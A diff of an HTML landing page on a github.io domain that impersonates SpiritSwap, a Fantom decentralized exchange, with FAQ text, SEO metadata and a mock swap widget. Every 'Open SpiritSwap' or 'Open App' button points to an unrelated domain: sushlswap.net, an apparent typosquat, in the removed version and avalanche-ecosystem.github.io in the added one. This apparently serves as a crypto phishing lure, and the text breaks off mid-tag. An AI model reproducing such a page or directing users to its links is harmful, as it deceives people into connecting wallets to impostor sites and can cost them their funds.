@@ -1,280 +1,47 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>SpiritSwap — Fantom DEX</title>
-<meta content="SpiritSwap is a non-custodial Fantom DEX. Open the app and swap tokens from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://spiritswap-app.github.io/" rel="canonical"/>
-<link href="https://spiritswap-app.github.io/" hreflang="en" rel="alternate"/><link href="https://spiritswap-app.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#0B0F08" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="SpiritSwap — Fantom DEX" property="og:title"/><meta content="SpiritSwap is a non-custodial Fantom DEX. Open the app and swap tokens from your own wallet." property="og:description"/>
-<meta content="https://spiritswap-app.github.io/" property="og:url"/><meta content="https://spiritswap-app.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="SpiritSwap — Fantom DEX" name="twitter:title"/><meta content="SpiritSwap is a non-custodial Fantom DEX. Open the app and swap tokens from your own wallet." name="twitter:description"/><meta content="https://spiritswap-app.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://spiritswap-app.github.io/#website",
-      "url": "https://spiritswap-app.github.io/",
-      "name": "SpiritSwap"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://spiritswap-app.github.io/#webpage",
-      "url": "https://spiritswap-app.github.io/",
-      "name": "SpiritSwap — Fantom DEX",
-      "description": "SpiritSwap is a non-custodial Fantom DEX. Open the app and swap tokens from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://spiritswap-app.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://spiritswap-app.github.io/#org",
-      "name": "SpiritSwap",
-      "url": "https://spiritswap-app.github.io/",
-      "logo": "https://spiritswap-app.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://spiritswap-app.github.io/#app",
-      "name": "SpiritSwap",
-      "url": "https://spiritswap-app.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "SpiritSwap is a non-custodial Fantom DEX. Open the app and swap tokens from your own wallet.",
-      "featureList": [
-        "Fantom DEX",
-        "Swap on Fantom, from your wallet"
-      ],
-      "isPartOf": {
-        "@id": "https://spiritswap-app.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://spiritswap-app.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Is SpiritSwap still an official Fantom DEX?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "SpiritSwap is a real Fantom DEX brand with an official website at spiritswap.finance, but its documentation and operations have changed over time. Treat it as a protocol to research carefully, not as a fresh launch or a recommendation."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What happened to SpiritSwap after Multichain?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "SpiritSwap was affected by the Multichain fallout. Cointelegraph reported that the team planned to wind down after its treasury was drained by Multichain exposure. Read the coverage and verify the present app state before using old bridge, farm or lock instructions."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Which network does SpiritSwap use?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "SpiritSwap is Fantom-focused. The official getting started docs describe it as a DEX on the Fantom Opera Chain, meaning wallet network settings and FTM gas are central to normal use."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What fees should I expect on SpiritSwap?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Expect components rather than one universal number: Fantom gas, approval gas, pool trading fees, price impact, slippage settings and any bridge-related charges. The SpiritSwap V2 fee docs show that fee logic can vary by pool type."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What is inSPIRIT?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "inSPIRIT is the vote-locked SPIRIT utility token described in SpiritSwap V2 docs for governance, rewards, boosts and gauge-related functions. The inSPIRIT docs are useful background, but current lock, claim and governance behavior should be verified before committing tokens."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How should I check a SpiritSwap link before connecting?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Start from the official general resources page or the SpiritSwap website, then verify the domain, wallet network, token contract and approval prompt. Avoid search ads, copied social links and old guides that may point to retired routes."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SpiritSwap - Open App</title><meta name="description" content="spiritswap opens the official Fantom DEX app for token swaps, liquidity, farms, and wallet-based DeFi actions.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://spiritswap-app.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="SpiritSwap - Open App"><meta property="og:description" content="spiritswap opens the official Fantom DEX app for token swaps, liquidity, farms, and wallet-based DeFi actions.">
+<meta property="og:url" content="https://spiritswap-app.github.io/"><meta property="og:image" content="https://spiritswap-app.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SpiritSwap - Open App"><meta name="twitter:description" content="spiritswap opens the official Fantom DEX app for token swaps, liquidity, farms, and wallet-based DeFi actions."><meta name="twitter:image" content="https://spiritswap-app.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://spiritswap-app.github.io/#website", "url": "https://spiritswap-app.github.io/", "name": "SpiritSwap"}, {"@type": "WebPage", "@id": "https://spiritswap-app.github.io/#webpage", "url": "https://spiritswap-app.github.io/", "name": "SpiritSwap - Open App", "description": "spiritswap opens the official Fantom DEX app for token swaps, liquidity, farms, and wallet-based DeFi actions.", "inLanguage": "en", "isPartOf": {"@id": "https://spiritswap-app.github.io/#website"}}, {"@type": "Organization", "@id": "https://spiritswap-app.github.io/#org", "name": "SpiritSwap", "url": "https://spiritswap-app.github.io/", "logo": "https://spiritswap-app.github.io/og-cover.png", "sameAs": ["https://github.com/Spirit-DAO", "https://www.coingecko.com/en/exchanges/spiritswap", "https://www.coingecko.com/en/coins/spiritswap", "https://defillama.com/protocol/spiritswap"]}, {"@type": "WebApplication", "@id": "https://spiritswap-app.github.io/#app", "name": "SpiritSwap", "url": "https://spiritswap-app.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "spiritswap opens the official Fantom DEX app for token swaps, liquidity, farms, and wallet-based DeFi actions.", "featureList": ["Fantom Opera", "AMM + stable swap", "Wallet connect"], "isPartOf": {"@id": "https://spiritswap-app.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://spiritswap-app.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is SpiritSwap used for?", "acceptedAnswer": {"@type": "Answer", "text": "SpiritSwap is used to swap Fantom-based tokens, provide liquidity, farm rewards, bridge assets into Fantom, and lock SPIRIT into inSPIRIT. It is a Fantom DeFi hub rather than a custodial exchange. Users connect a wallet, approve token spending, and interact with smart contracts directly."}}, {"@type": "Question", "name": "What is SPIRIT on SpiritSwap?", "acceptedAnswer": {"@type": "Answer", "text": "SPIRIT is the SpiritSwap protocol token. It is used in farming incentives and can be locked into inSPIRIT for boost, revenue-sharing, and governance-related functions described by the protocol. Like other DEX tokens, SPIRIT's market price and liquidity can be volatile, so token exposure matters when farming or locking."}}, {"@type": "Question", "name": "Does SpiritSwap only run on Fantom?", "acceptedAnswer": {"@type": "Answer", "text": "SpiritSwap is primarily a Fantom Opera DEX. The protocol's core swap and farm activity is centered on Fantom, though its bridge interface helps users move assets from other chains into Fantom. Users should make sure their wallet is on Fantom before trying to trade or provide liquidity."}}, {"@type": "Question", "name": "How do SpiritSwap farms work?", "acceptedAnswer": {"@type": "Answer", "text": "SpiritSwap farms reward users who deposit liquidity pool tokens. The pool earns swap fees when trades occur, and farms may distribute SPIRIT incentives. Returns vary by pool volume, liquidity, emissions, token price, and impermanent loss. A high displayed APR can fall quickly if token prices move or more liquidity enters."}}, {"@type": "Question", "name": "What is inSPIRIT?", "acceptedAnswer": {"@type": "Answer", "text": "inSPIRIT is the locked SPIRIT position used in SpiritSwap's boost, reward-sharing, and governance model. The official site describes inSPIRIT as giving participants farm-emission boosts, a share of DEX swap revenue, and voting participation. Locking reduces liquidity, so users should understand lock duration and opportunity cost first."}}, {"@type": "Question", "name": "Is SpiritSwap audited?", "acceptedAnswer": {"@type": "Answer", "text": "The SpiritSwap site references audits and links audit-related repositories. Audit coverage can reduce some smart-contract uncertainty, but it does not remove all risk. Users still need to consider token approvals, bridge risk, pool liquidity, price impact, farm emissions, and the possibility of interacting with fake tokens or duplicate domains."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="SpiritSwap" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#98F149"></stop><stop offset=".5" stop-color="#67C316"></stop><stop offset="1" stop-color="#498B0F"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>SpiritSwap</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-works">How it works</a></li><li><a href="#fees-security">Fees security</a></li><li><a href="#current-context">Current context</a></li><li><a href="#core-surfaces">Core surfaces</a></li><li><a href="#fantom-assets">Fantom assets</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open SpiritSwap</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="SpiritSwap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">SpiritSwap</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Swap on Fantom, from your wallet</h2>
-<p class="lead">A clear guide to <strong>SpiritSwap</strong>, the Fantom DEX known for swaps, liquidity pools, farming and SPIRIT token utilities.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open SpiritSwap ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open SpiritSwap to swap on Fantom.</p><div class="trust-row"><span class="trust-chip">Fantom</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Swap</span><span class="badge">Fantom</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="FTM" class="" decoding="async" height="28" loading="lazy" src="ftm.png" width="28"/></span><span class="token-ticker">FTM</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><span aria-hidden="true" class="coin-fallback">SPIRIT</span></span><span class="token-ticker">SPIRIT</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open SpiritSwap ↗</a>
-<p class="swap-note">Preview — open SpiritSwap to swap.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is SpiritSwap?</h2><div class="capsule"><strong>SpiritSwap</strong> is a decentralized exchange built for the Fantom ecosystem, with swaps, liquidity pools, farms, bridge tooling and SPIRIT-related governance features. The official <a href="https://docs.silverswap.io/spirit-swap/master" rel="noopener noreferrer">SpiritSwap docs</a> describe the original design as a Uniswap-style automated market maker on Fantom. Today, research should also include its Multichain exposure history, redirected documentation and the condition of any live interface before connecting a wallet.</div></div></section>
-<section class="section section-alt" id="how-it-works">
-<div class="container"><h2>How SpiritSwap works</h2><p class="section-intro">SpiritSwap routes trades through Fantom-based liquidity pools. The exact result depends on pool depth, token contracts, approvals, slippage settings and network conditions.</p>
-<ol class="steps"><li><strong>Choose Fantom assets</strong><span>Select the network and token pair carefully, then verify the token contract before approving spend.</span></li><li><strong>Review the route</strong><span>The interface estimates output from available pools and route logic, including price impact and minimum received.</span></li><li><strong>Approve and swap</strong><span>Your wallet may require a token approval before the swap transaction. Both actions use Fantom gas.</span></li><li><strong>Check the receipt</strong><span>After confirmation, review balances and transaction details on Fantom rather than relying only on the page state.</span></li></ol>
-</div>
-</section>
-<section class="section" id="fees-security">
-<div class="container"><h2>Fees and security</h2><p class="section-intro">There is no single SpiritSwap cost to quote across every action. Costs are route-specific and should be reviewed before signing.</p>
-<div class="cards three"><article class="card"><h3>Cost components</h3><p>Expect Fantom gas, token approval gas, pool trading fees, price impact, slippage limits and any bridge-related charges shown by the connected interface. The <a href="https://docs.silverswap.io/spiritswap-v2/core-features/protocol-fees" rel="noopener noreferrer">protocol fee docs</a> explain that different pool types can use different fee structures.</p></article><article class="card"><h3>Self-custody</h3><p>SpiritSwap is used through wallet-signed transactions, not an exchange account. Learn the self-custody basics from <a href="https://ethereum.org/en/wallets/" rel="noopener noreferrer">ethereum.org</a>, then check the domain, chain, token and wallet prompt before each approval.</p></article><article class="card"><h3>Bridge and contract risk</h3><p>Non-custodial trading still carries smart-contract, routing, liquidity, bridge, token and governance risk. Old bridge routes deserve extra review because Fantom's ecosystem was materially affected by the Multichain incident.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="current-context">
-<div class="container"><h2>Current SpiritSwap context</h2><p class="section-intro">SpiritSwap is best researched as a real Fantom DeFi brand with a complicated recent history. Treat old guides, yield claims and bridge instructions as stale until verified.</p>
-<div class="cards three"><article class="card"><h3>Official sources moved</h3><p>The SpiritSwap site links to docs that now redirect into SilverSwap documentation, while legacy SpiritSwap V2 pages remain available. Start from the official <a href="https://www.spiritswap.finance/" rel="noopener noreferrer">SpiritSwap website</a> and cross-check documentation before using any app link.</p></article><article class="card"><h3>Multichain fallout</h3><p>Cointelegraph reported that SpiritSwap planned to wind down after Multichain exposure drained its treasury. Read that <a href="https://cointelegraph.com/news/spiritswap-fantom-project-winds-down-citing-multichain-exposure" rel="noopener noreferrer">incident coverage</a> before treating older bridge or farming material as routine.</p></article><article class="card"><h3>Market data is not a safety signal</h3><p>Listings on trackers can help identify markets and links, but they do not prove liquidity quality or protocol health. Use pages such as <a href="https://www.coingecko.com/en/exchanges/spiritswap" rel="noopener noreferrer">CoinGecko</a> as one input, not as a recommendation.</p></article></div>
-</div>
-</section>
-<section class="section" id="core-surfaces">
-<div class="container">
-<h2>SpiritSwap Surfaces</h2>
-<p class="section-intro">These are the main SpiritSwap areas people usually mean when researching the DEX.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SWAP</span>
-<div><h3>Swap</h3><p class="coin-sub">Token trades on Fantom <span class="tag">Core</span></p></div>
-</div>
-<p class="coin-intent">Use this surface for wallet-routed token swaps. Confirm the route, output, token contract and slippage before signing.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SWAP" href="https://docs.silverswap.io/spiritswap-v2/core-features/exchange" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">LP</span>
-<div><h3>Liquidity</h3><p class="coin-sub">Pool deposits and withdrawals <span class="tag">Pools</span></p></div>
-</div>
-<p class="coin-intent">Liquidity providers deposit paired assets and receive pool shares. Impermanent loss, token risk and exit liquidity still matter.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="LP" href="https://docs.silverswap.io/spiritswap-v2/core-features/liquidity/vamm" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">FARM</span>
-<div><h3>Farms</h3><p class="coin-sub">Incentivized LP positions <span class="tag">Yield</span></p></div>
-</div>
-<p class="coin-intent">Farm pages historically added SPIRIT incentives to selected LP tokens. Avoid relying on old yield screenshots or stale guides.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="FARM" href="https://docs.silverswap.io/spiritswap-v2/core-features/yield-farms" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SPIRIT</span>
-<div><h3>SPIRIT</h3><p class="coin-sub">Native protocol token <span class="tag">Token</span></p></div>
-</div>
-<p class="coin-intent">SPIRIT is tied to protocol incentives and governance history. Check contract addresses and current liquidity before trading it.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SPIRIT" href="https://docs.silverswap.io/spiritswap-v2/tokenomics/usdspirit/risks" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">inSP</span>
-<div><h3>inSPIRIT</h3><p class="coin-sub">Locked governance utility <span class="tag">Govern</span></p></div>
-</div>
-<p class="coin-intent">inSPIRIT represented vote-locked SPIRIT utility for rewards, boosts and governance. Locking terms and claim paths need fresh verification.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="inSP" href="https://docs.silverswap.io/spiritswap-v2/core-features/inspirit" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">DATA</span>
-<div><h3>Analytics</h3><p class="coin-sub">Pool and market review <span class="tag">Review</span></p></div>
-</div>
-<p class="coin-intent">Use analytics and trackers to inspect activity before trading. Thin or inactive markets can make quoted output unreliable.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="DATA" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="fantom-assets">
-<div class="container">
-<h2>Assets Often Seen Around SpiritSwap</h2>
-<p class="section-intro">Token availability changes, so treat this as research context rather than a promise that a pair is liquid.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="FTM" class="coin-icon" decoding="async" height="40" loading="lazy" src="ftm.png" width="40"/>
-<div><h3>Fantom</h3><p class="coin-sub">Gas and ecosystem asset <span class="tag">Gas</span></p></div>
-</div>
-<p class="coin-intent">FTM is needed for gas on Fantom transactions. Keep enough for approvals, swaps and withdrawals.</p>
-<a class="cta cta-mini swap-now" data-icon="ftm.png" data-ticker="FTM" href="https://fantom.foundation/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="WFTM" class="coin-icon" decoding="async" height="40" loading="lazy" src="wftm.png" width="40"/>
-<div><h3>Wrapped Fantom</h3><p class="coin-sub">Wrapped FTM in pools <span class="tag">Pool</span></p></div>
-</div>
-<p class="coin-intent">WFTM commonly appears in Fantom AMM pairs. Check whether the interface wraps or unwraps FTM for the route.</p>
-<a class="cta cta-mini swap-now" data-icon="wftm.png" data-ticker="WFTM" href="https://docs.silverswap.io/spirit-swap/master" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SPIRIT</span>
-<div><h3>SpiritSwap Token</h3><p class="coin-sub">Protocol token <span class="tag">Token</span></p></div>
-</div>
-<p class="coin-intent">SPIRIT pairs may be thin compared with older guides. Verify live depth, contract address and route before entering.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SPIRIT" href="https://docs.silverswap.io/spiritswap-v2/tokenomics/usdspirit/risks" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="USDC" class="coin-icon" decoding="async" height="40" loading="lazy" src="usdc.png" width="40"/>
-<div><h3>USD Coin</h3><p class="coin-sub">Stablecoin routes <span class="tag">Stable</span></p></div>
-</div>
-<p class="coin-intent">USDC-style routes can involve native, bridged or legacy versions. Match the exact contract to the Fantom asset you intend to hold.</p>
-<a class="cta cta-mini swap-now" data-icon="usdc.png" data-ticker="USDC" href="https://www.circle.com/usdc" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="FRAX" class="coin-icon" decoding="async" height="40" loading="lazy" src="frax.png" width="40"/>
-<div><h3>Frax</h3><p class="coin-sub">Legacy stablecoin liquidity <span class="tag">Stable</span></p></div>
-</div>
-<p class="coin-intent">FRAX has appeared in Fantom DeFi pools, but bridge provenance and liquidity should be checked before relying on a route.</p>
-<a class="cta cta-mini swap-now" data-icon="frax.png" data-ticker="FRAX" href="https://docs.frax.com/protocol" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="MIM" class="coin-icon" decoding="async" height="40" loading="lazy" src="mim.png" width="40"/>
-<div><h3>Magic Internet Money</h3><p class="coin-sub">Abracadabra stable asset <span class="tag">Stable</span></p></div>
-</div>
-<p class="coin-intent">MIM may appear in older Fantom routes and market trackers. Confirm current backing, chain version and pool depth.</p>
-<a class="cta cta-mini swap-now" data-icon="mim.png" data-ticker="MIM" href="https://abracadabra.money/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="faq"><div class="container"><h2>SpiritSwap FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>Is SpiritSwap still an official Fantom DEX?</h3></summary><div>SpiritSwap is a real Fantom DEX brand with an official website at <a href="https://www.spiritswap.finance/" rel="noopener noreferrer">spiritswap.finance</a>, but its documentation and operations have changed over time. Treat it as a protocol to research carefully, not as a fresh launch or a recommendation.</div></details>
-<details open=""><summary><h3>What happened to SpiritSwap after Multichain?</h3></summary><div>SpiritSwap was affected by the Multichain fallout. Cointelegraph reported that the team planned to wind down after its treasury was drained by Multichain exposure. Read the <a href="https://cointelegraph.com/news/spiritswap-fantom-project-winds-down-citing-multichain-exposure" rel="noopener noreferrer">coverage</a> and verify the present app state before using old bridge, farm or lock instructions.</div></details>
-<details><summary><h3>Which network does SpiritSwap use?</h3></summary><div>SpiritSwap is Fantom-focused. The official <a href="https://docs.silverswap.io/spirit-swap/master" rel="noopener noreferrer">getting started docs</a> describe it as a DEX on the Fantom Opera Chain, meaning wallet network settings and FTM gas are central to normal use.</div></details>
-<details><summary><h3>What fees should I expect on SpiritSwap?</h3></summary><div>Expect components rather than one universal number: Fantom gas, approval gas, pool trading fees, price impact, slippage settings and any bridge-related charges. The <a href="https://docs.silverswap.io/spiritswap-v2/core-features/protocol-fees" rel="noopener noreferrer">SpiritSwap V2 fee docs</a> show that fee logic can vary by pool type.</div></details>
-<details><summary><h3>What is inSPIRIT?</h3></summary><div>inSPIRIT is the vote-locked SPIRIT utility token described in SpiritSwap V2 docs for governance, rewards, boosts and gauge-related functions. The <a href="https://docs.silverswap.io/spiritswap-v2/core-features/inspirit" rel="noopener noreferrer">inSPIRIT docs</a> are useful background, but current lock, claim and governance behavior should be verified before committing tokens.</div></details>
-<details><summary><h3>How should I check a SpiritSwap link before connecting?</h3></summary><div>Start from the official <a href="https://docs.silverswap.io/spiritswap-v2/general-resources" rel="noopener noreferrer">general resources</a> page or the SpiritSwap website, then verify the domain, wallet network, token contract and approval prompt. Avoid search ads, copied social links and old guides that may point to retired routes.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>SpiritSwap</h1>
+      <div class="bridge-widget" role="group" aria-label="SpiritSwap preview"><div class="bw-field"><span class="bw-coin mono">FTM</span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>FTM</b> · Fantom</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin mono">SPI</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>SPIRIT</b> · Fantom</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open SpiritSwap ↗</a></div>
+      <p class="hero-note">Live preview — open the official SpiritSwap app from your own wallet.</p>
+      <div class="trust-row"><span class="trust-chip">Fantom Opera</span><span class="trust-chip">AMM + stable swap</span><span class="trust-chip">Wallet connect</span></div>
+    </div>
+  </section>
+  <section class="section" id="about"><div class="container"><h2>What is SpiritSwap?</h2><div class="capsule"><strong>SpiritSwap</strong> is a <a class="inline-link" href="https://www.investopedia.com/terms/d/decentralized-exchange.asp" rel="noopener noreferrer">decentralized exchange</a> on the <a href="https://fantom.foundation/">Fantom</a> Opera chain for token swaps, liquidity, farms, bridge access, and inSPIRIT features.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2>SpiritSwap at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Fantom decentralized exchange</b></div><div class="f"><small>Network</small><b>Fantom</b></div><div class="f"><small>Token</small><b>SPIRIT</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://ethereum.org/en/developers/docs/smart-contracts/" rel="noopener noreferrer">Non-custodial smart contracts</a></b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>SpiritSwap on Fantom and SPIRIT token</h2><div class="intent-a">SpiritSwap is a decentralized exchange on the Fantom Opera network. The app supports token swaps, <a class="inline-link" href="https://www.binance.com/en/academy/article/what-are-liquidity-pools-in-defi" rel="noopener noreferrer">liquidity pools</a>, farms, a bridge interface, and inSPIRIT locking. SPIRIT is the protocol token used for incentives, governance-related participation, and locking into inSPIRIT. The official site describes SpiritSwap as a Fantom DeFi hub rather than just a single swap screen, which matches real search demand around SPIRIT farms, inSPIRIT rewards, bridge routes, and Fantom token liquidity. Users should treat current <a class="inline-link" href="https://defillama.com/protocol/spiritswap" rel="noopener noreferrer">TVL</a>, volume, and SPIRIT market data as live metrics because Fantom DEX activity changes quickly.</div></div></section><section class="section"><div class="container"><h2>SpiritSwap fees and best swap rates</h2><div class="intent-a">SpiritSwap swap costs include Fantom gas, pool fees, and any <a class="inline-link" href="https://www.coingecko.com/learn/price-impact-vs-slippage" rel="noopener noreferrer">price impact</a> from the selected trading pair. The official site says its AMM architecture combines an upgraded UniV2-style AMM with stable swap functionality, which is intended to improve rates across volatile and stable assets. For real users, the quoted output is more important than a generic fee claim: thin Fantom pools can create <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener 